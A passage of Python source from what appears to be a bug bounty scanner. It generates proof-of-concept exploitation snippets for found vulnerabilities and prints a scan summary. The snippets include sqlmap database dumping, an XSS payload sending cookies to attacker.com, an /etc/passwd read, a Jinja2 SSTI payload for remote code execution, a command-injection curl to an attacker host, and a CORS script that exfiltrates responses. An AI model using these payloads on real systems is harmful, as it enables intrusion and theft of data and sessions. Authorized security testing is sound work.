    def _poc_for(self, v):
        """Generate a PoC / exploitation example for high-severity vulns."""
        vt = v.get("type", "")
        url = v.get("url", "")
        param = v.get("param")
        payload = v.get("payload")
        if "SQLi" in vt:
            if "time-based" in vt.lower():
                return (f"# Time-based SQLi PoC\n"
                        f"curl -G \"{url}\" --data-urlencode \"{param}={payload}\"\n"
                        f"# Measure response time — if > 3s, injection confirmed\n"
                        f"# Then use sqlmap for full extraction:\n"
                        f"sqlmap -u \"{url}\" --data=\"{param}={payload}\" "
                        f"--level=5 --risk=3 --batch --dump")
            else:
                return (f"# Error-based SQLi PoC\n"
                        f"curl -G \"{url}\" --data-urlencode \"{param}={payload}\"\n"
                        f"sqlmap -u \"{url}\" --data=\"{param}={payload}\" --batch --dbs")
        if "XSS" in vt:
            return (f"# Reflected XSS PoC\n"
                    f"Open in browser:\n{url}\n"
                    f"# Browser will execute the payload — capture cookie via:\n"
                    f"# <script>fetch('https://attacker.com/?c='+document.cookie)</script>")
        if vt == "LFI":
            return (f"# LFI PoC — read /etc/passwd\n"
                    f"curl -G \"{url}\" --data-urlencode \"{param}={payload}\"\n"
                    f"# Extract base64-encoded source:\n"
                    f"# curl '{url}?{param}=php://filter/convert.base64-encode"
                    f"/resource=index.php' | base64 -d")
        if "SSTI" in vt:
            return (f"# SSTI PoC\n"
                    f"curl -G \"{url}\" --data-urlencode \"{param}={payload}\"\n"
                    f"# Escalate to RCE (Jinja2): {param}=" + 
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
        if vt == "Open Redirect":
            return (f"# Open Redirect PoC\n"
                    f"https://target.com/?redirect=https://evil.attacker.com\n"
                    f"# Victim clicks, gets redirected to attacker-controlled site.")
        if vt == "Command Injection":
            return (f"# Command Injection PoC\n"
                    f"curl -G \"{url}\" --data-urlencode \"{param}={payload}\"\n"
                    f"# Confirm with OOB:\n"
                    f"# payload: ;curl https://attacker.com/$(whoami)")
        if "IDOR" in vt:
            return (f"# IDOR PoC\n"
                    f"curl -H 'Cookie: <your_session>' \"{url}\"\n"
                    f"# Compare response with original {param}={v.get('original')} — "
                    f"different content indicates unauthorized access.")
        if "CORS Misconfiguration" in vt:
            origin = v.get("origin", "https://evil.attacker.com")
            return (f"# CORS Misconfiguration PoC\n"
                    f"<!-- host this on attacker.com -->\n"
                    f"<script>\n"
                    f"fetch('{self.target}', {{credentials:'include'}})\n"
                    f"  .then(r => r.text()).then(t =>\n"
                    f"    fetch('{origin}/?data=' + btoa(t)));\n"
                    f"</script>")
        if vt == "Default Credentials":
            return (f"# Default Credentials PoC\n"
                    f"curl -X POST \"{v.get('panel', url)}\" "
                    f"-d \"username={v.get('username')}&password={v.get('password')}\"\n"
                    f"# If hit, login is unauthorized — report immediately.")
        if "Backup File Exposed" in vt:
            return (f"# Backup File PoC\n"
                    f"curl -O \"{url}\"\n"
                    f"# Extract with: tar -xzf {url.split('/')[-1]} "
                    f"# or unzip {url.split('/')[-1]}")
        if "Cloud Bucket Exposure" in vt:
            return (f"# Cloud Bucket PoC\n"
                    f"curl \"{url}?list-type=2\"\n"
                    f"# Or use awscli:\n"
                    f"aws s3 ls s3://{v.get('bucket','')} --no-sign-request")
        return None

    def summary(self, json_path, md_path):
        print(f"\n{C.BOLD}{'='*70}{C.RESET}")
        print(f"{C.BOLD} BUG BOUNTY SCAN COMPLETE — {self.target}{C.RESET}")
        print(f"{C.BOLD}{'='*70}{C.RESET}")
        s = self.results["stats"]
        print(f"  Requests: {s['requests_made']}  |  Errors: {s['errors']}")
        if self.results["cms"]:
            print(f"  CMS:      {self.results['cms']}")
        if self.results["tech_stack"]:
            print(f"  Tech:     {', '.join(self.results['tech_stack'][:5])}")
        print(f"  Subdomains:  {len(self.results['subdomains_found'])}")
        print(f"  Open ports:  {len(self.results['ports_open'])}")
        print(f"  Admin panels: {len(self.results['admin_panels'])}")
        print(f"  Sensitive files: {len(self.results['sensitive_files'])}")
        print(f"  Default creds cracked: "
              f"{C.MAG}{len(self.results['default_creds_hits'])}{C.RESET}")
        print(f"  JS secrets: {len(self.results['js_secrets'])}")
        print(f"  GraphQL endpoints: {len(self.results['graphql_endpoints'])}")
        print(f"  Swagger endpoints: {len(self.results['swagger_endpoints'])}")
        by_sev = defaultdict(int)
        for v in self.results["vulnerabilities"]:
            by_sev[v["severity"]] += 1
        print(f"\n  {C.BOLD}Vulnerabilities by severity:{C.RESET}")
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if by_sev[sev]:
                col = severity_color(sev)
                print(f"    {col}{sev}{C.RESET}: {by_sev[sev]}")
        print(f"  TOTAL: {sum(by_sev.values())}")
        print(f"\n  Full JSON:      {json_path}")
        print(f"  Markdown:       {md_path}")
        print(f"  State file:     {self.state_path}")
        print(f"{C.BOLD}{'='*70}{C.RESET}")

